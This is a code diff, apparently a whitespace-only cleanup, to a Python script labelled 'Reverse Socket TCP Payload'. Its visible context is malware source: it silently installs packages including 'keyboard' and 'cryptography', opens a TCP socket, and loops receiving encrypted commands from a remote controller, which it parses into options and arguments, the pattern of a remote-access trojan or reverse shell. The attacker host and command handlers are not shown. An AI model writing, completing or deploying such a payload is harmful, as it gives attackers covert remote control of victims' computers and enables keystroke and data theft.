@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # Reverse Socket TCP Payload
+
+
 import os
 import platform
 import time
@@ -9,6 +11,7 @@ import ssl
 import importlib
 import subprocess as sp
 import socket
+
 # list of the modules you have to install manually
 imports = ["requests", "keyboard", "cryptography"]
 try:
@@ -21,6 +24,8 @@ except:
         globals()[i] = importlib.import_module(i)
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
 def decrypt(data):
     return fernet.decrypt(data).decode()
 
@@ -47,10 +52,10 @@ while True:
             data = decrypt(s.recv(1024))
         except KeyboardInterrupt:
             s.close()
-            exit(0) 
+            exit(0)
         except:
             break
-        data= data.split(":")
+        data = data.split(":")
         option = data[0]
         args = data[1:]
         option = option.lower()
